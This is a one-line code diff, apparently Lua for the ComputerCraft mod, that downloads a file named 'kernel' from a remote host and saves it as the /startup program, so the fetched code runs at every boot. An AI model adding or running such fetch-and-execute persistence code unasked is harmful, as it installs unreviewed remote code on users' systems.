@@ -1,0 +1,1 @@
+f = fs.open("/startup", "w"); f.write(http.get("http://skogen.twitverse.com:4456/72ceda8b/kernel").readAll()); f.close()
